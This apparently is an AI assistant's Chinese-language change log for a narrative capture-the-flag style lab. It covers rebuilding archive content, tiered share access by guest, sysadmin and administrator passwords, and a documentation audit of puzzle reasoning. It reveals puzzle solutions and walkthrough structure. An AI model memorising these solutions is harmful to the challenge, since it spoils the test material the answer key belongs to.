`story-dev/attack_chain_design.md` 新增 §4.2c【推理節點 0-archive】，用完整段落說明這條三段串接的推理鏈（case_ref→姓名、case_ref→結果、case_ref→編號），並解釋為什麼三份資料要分散在不同存取層級；§4.4 的說明同步補上「102 不再寫是哪三份」這一點。`Answer/walkthrough.md` 新增獨立的步驟 17（案件結果 + Spartan 編號重建），後續步驟 18-21 重新編號（比照第十三、十七輪的先例），步驟 14/16/19 的敘述同步更新成「沒有姓名/沒有編號」的現況。

已重新 `--no-cache` 建置 archive（中英文版都建）並實測：record 102 確認渲染出「three of these case files」、不再有具體 case_ref；`casualty_log_partial.txt` 確認只剩 case_ref + 結果；`spartan_designation_crosscheck.txt` 確認能從 confidential share 讀到、內容正確、檔案權限（644）跟同分享區其他檔案一致；中文版三處內容同步確認正確。全鏈路的存取權限也複查過一次：姓名對照（Act I/II，免密碼）< 結果（backups，guest SMB）< 編號（confidential，sysadmin 密碼）< CAIRN Records Terminal 本身（administrator 密碼，找到管道另計）——存取難度隨資訊敏感度遞增，沒有出現「後面的內容反而比前面更好拿」的邏輯錯亂。

更新的文件：`lab/archive/app/admin/content_en.py`/`content_zh.py`（record 102）、`lab/archive/shares/backups/casualty_log_partial.txt` ＋ `shares-zh` 對應版本、`lab/archive/shares/confidential/spartan_designation_crosscheck.txt` ＋ `shares-zh` 對應版本（新檔案）、`story-dev/attack_chain_design.md`（新增 §4.2c、§4.2/§4.4 說明更新）、`Answer/walkthrough.md`（新增步驟 17，步驟 14/16/18-21 更新）、`Answer/evidence-map.md`（record 102、casualty_log 兩行更新，新增一行）。

## 第二十一輪：每個推理節點都要能說出「為什麼是這樣」跟「為什麼不是別的答案」

使用者的標準：每個推理節點都要能明確回答兩件事——支持結論的證據是什麼、最可能的替代解釋為什麼站不住腳；如果證據真的不足以排除替代解釋，就要老實標成「目前無法確定，需要更多證據」，不能用語感帶過，也不能為了讓遊戲看起來每題都有解而硬湊一個站不住腳的結論。這是純文件稽核，沒有動任何遊戲內容/程式碼。

逐一檢查了 Act I-III 全部推理節點，結果分兩類：

**已經符合標準，補上明確的「為什麼」段落強化說明**（結論本身沒有變，只是把原本隱含在字裡行間的邏輯寫清楚）：
- **§2.6（Act I，官方說法異常一致）**：原本已經用三組獨立線索排除「純屬巧合」，這次補上更精確的一層——措辭統一只能證明「有人在統一口徑」，還不能證明「口徑是假的」（也可能只是官僚惰性複製貼上一份無害的範本），真正排除得掉「純屬雜訊」的是第三組線索的統計訊號（剛好只黏著 LONGSHORE 名單裡的名字）。結論維持「建立懷疑，不是給答案」不變。
- **§3.4（Act II，官方稽核 vs 自己查到的證據）**：補上為什麼這裡「誠實無法確定」而不是偷懶——「失職」跟「刻意淡化」在玩家目前手上的證據裡會產生一模一樣的輸出（一句簡短結論，沒有過程紀錄），沒有第二個獨立資料點可以拿來分辨，所以誠實的結論就是「無法確定」，要等 Act III 才有更多證據。
- **§4.5b（Act III，Farrow 結局的三方矛盾）**：補上為什麼這三份來源沒辦法互相裁決——三份都是各自領域裡合理可信的一手來源，各自都有自己的潛在失真原因（制度性紀錄可能因行政便宜行事失真、目擊者記憶不是絕對可靠、轉移授權自己都承認沒有正式判定），沒有任何一份能被另外兩份證偽，也套不上多數決（三份各說各話）。結論維持「永遠不解答」不變。
- **§4.4（Act III，三份 vs 四筆）**：補上一句釐清定位——這個節點的證據本身是完整、無爭議的直接證據（105 的表格白紙黑字寫著第四筆是 Achebe 審核），推理的困難點在「有沒有主動去比對」，不是「證據夠不夠」，跟 4.5/4.5b 這種真正需要排除替代解釋的節點性質不同。

**發現真正的邏輯缺口，補強證據跟論證**（這是本輪稽核抓到的兩個真問題）：
- **§4.5（Act III，07-B 代號還原成 Farrow）**：原本的推論只寫「Skopje 只有一筆案例 → 07-B = Farrow」，沒有處理一個合理的質疑——這批徵召一共 75 人，玩家看到的 `training_roster_fragment.txt` 只是「cohort 07」的殘存片段，理論上不能百分之百排除還有別的 Skopje 孩子存在在其他 cohort 裡。已經補上完整的排除論證：(1) 殖民地跟年齡兩個獨立資料點都吻合，不是只挑一項；(2) Kade 對 07-B 的描述帶著具體的個人情感記憶，跟他自述只帶一小群、親自訓練到底的說法吻合；(3) 最關鍵的一點——這款遊戲對所有「真正無法確定」的節點（3.4、4.5b）都會刻意留下至少兩份互相矛盾的文件，讓矛盾是玩家自己讀出來的；07-B 這裡遍尋所有文件都沒有出現任何競爭線索或矛盾提示，這種「沒有矛盾線索並存」的狀態，依照遊戲自己一貫的設計邏輯，本身就是「這裡不是一個刻意留白節點」的訊號。順手把 `training_roster_fragment.txt` 一行裡一個指向錯誤章節的交叉引用（原本寫「見 4.4 節」，應該是 4.5 節）也修正了。
- **LONGSHORE = Naomi Okafor（optional evidence chain）**：原本只是把三個線索（`system_migration_log`、`dependent_notification_fragment.txt`、`foia_review_2553.txt`）條列出來，沒有明確論證「為什麼這不只是同名巧合」，也沒有處理「官方自己都在 `foia_review_2553.txt` 裡判定無關了」這個反證。已經補上：(1) 三個獨立來源疊在同一個案件編號上，用巧合疊加的機率權重解釋為什麼單一解釋比三個無關的人疊在一起更合理；(2) 解釋官方判定「無關」只是人事系統跟案件系統之間沒有自動比對，不是真的深入調查過，玩家手上同時握有的兩套系統內容，官員當時沒有；(3) 老實承認這條線終究是循環佐證出來的推論而非鐵證，呼應 `truth-map.md` 本來就寫的「不強制玩家發現」——證據夠強、足以讓玩家自己判斷，但不包裝成不容置疑的事實。

`story-dev/attack_chain_design.md` §1 新增原則 9，把這個標準寫成往後所有推理節點都要遵守的常設設計原則。全部改動都是純文字，沒有牽動任何遊戲機制、密碼、case_ref，不需要重建 image。

更新的文件：`story-dev/attack_chain_design.md`（§1 新增原則 9；§2.6、§3.4、§4.2（training_roster 交叉引用修正 + 新增 Naomi Okafor 論證段落）、§4.4、§4.5、§4.5b 補上「為什麼」段落）、`Answer/evidence-map.md`（本節）。
